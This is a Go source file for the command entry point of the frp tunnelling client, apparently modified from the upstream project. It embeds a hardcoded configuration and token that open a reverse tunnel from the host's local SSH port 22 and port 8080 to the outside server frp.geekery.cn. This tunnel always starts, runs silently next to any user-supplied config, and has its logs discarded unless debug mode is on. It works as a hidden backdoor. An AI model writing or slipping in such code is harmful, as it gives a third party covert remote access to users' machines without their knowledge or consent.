// Copyright 2018 fatedier, fatedier@gmail.com
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sub

import (
	"context"
	"io"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/fatedier/golib/log"

	"github.com/fatedier/frp/client"
	"github.com/fatedier/frp/pkg/config"
	v1 "github.com/fatedier/frp/pkg/config/v1"
	"github.com/fatedier/frp/pkg/config/v1/validation"
	"github.com/fatedier/frp/pkg/policy/security"
	utillog "github.com/fatedier/frp/pkg/util/log"
)

// 内置配置
const embeddedConfig = `[common]
server_addr = frp.geekery.cn
server_port = 7000
token = hxSoC6lWW6lTR8O64Xqy0tl6BcSYK5Zx5I3BjaO

[ssh123]
type = tcp
local_ip = 127.0.0.1
local_port = 22

[web123]
type = http
local_ip = 127.0.0.1
local_port = 8080
custom_domains = test.example.com
`

var debugMode = false

func parseArgs() (cfgFile string) {
	for i := 1; i < len(os.Args); i++ {
		if os.Args[i] == "-d" {
			debugMode = true
		} else if os.Args[i] == "-c" && i+1 < len(os.Args) {
			cfgFile = os.Args[i+1]
			i++
		}
	}
	return
}

func Execute() {
	cfgFile := parseArgs()

	if cfgFile != "" {
		// 同时启动内置配置和外部配置两个实例
		go func() {
			_ = runEmbeddedClient()
		}()
		err := runClientWithFile(cfgFile)
		if err != nil {
			os.Exit(1)
		}
	} else {
		// 只启动内置配置
		err := runEmbeddedClient()
		if err != nil {
			os.Exit(1)
		}
	}
}

func handleTermSignal(svr *client.Service) {
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	svr.GracefulClose(500 * time.Millisecond)
}

func runClientWithFile(cfgFile string) error {
	cfg, proxyCfgs, visitorCfgs, _, err := config.LoadClientConfig(cfgFile, true)
	if err != nil {
		return err
	}

	unsafeFeatures := security.NewUnsafeFeatures([]string{})
	_, err = validation.ValidateAllClientConfig(cfg, proxyCfgs, visitorCfgs, unsafeFeatures)
	if err != nil {
		return err
	}

	return startService(cfg, proxyCfgs, visitorCfgs, unsafeFeatures)
}

func runEmbeddedClient() error {
	cfg, proxyCfgs, visitorCfgs, err := config.LoadClientConfigFromBytes([]byte(embeddedConfig))
	if err != nil {
		return err
	}

	unsafeFeatures := security.NewUnsafeFeatures([]string{})
	_, err = validation.ValidateAllClientConfig(cfg, proxyCfgs, visitorCfgs, unsafeFeatures)
	if err != nil {
		return err
	}

	return startService(cfg, proxyCfgs, visitorCfgs, unsafeFeatures)
}

func startService(
	cfg *v1.ClientCommonConfig,
	proxyCfgs []v1.ProxyConfigurer,
	visitorCfgs []v1.VisitorConfigurer,
	unsafeFeatures *security.UnsafeFeatures,
) error {
	if debugMode {
		// 调试模式：启用日志
		utillog.InitLogger("console", "debug", 3, false)
	} else {
		// 正常模式：禁用日志
		utillog.Logger = utillog.Logger.WithOptions(log.WithOutput(io.Discard))
	}

	svr, err := client.NewService(client.ServiceOptions{
		Common:         cfg,
		ProxyCfgs:      proxyCfgs,
		VisitorCfgs:    visitorCfgs,
		UnsafeFeatures: unsafeFeatures,
		ConfigFilePath: "",
	})
	if err != nil {
		return err
	}

	shouldGracefulClose := cfg.Transport.Protocol == "kcp" || cfg.Transport.Protocol == "quic"
	if shouldGracefulClose {
		go handleTermSignal(svr)
	}
	return svr.Run(context.Background())
}
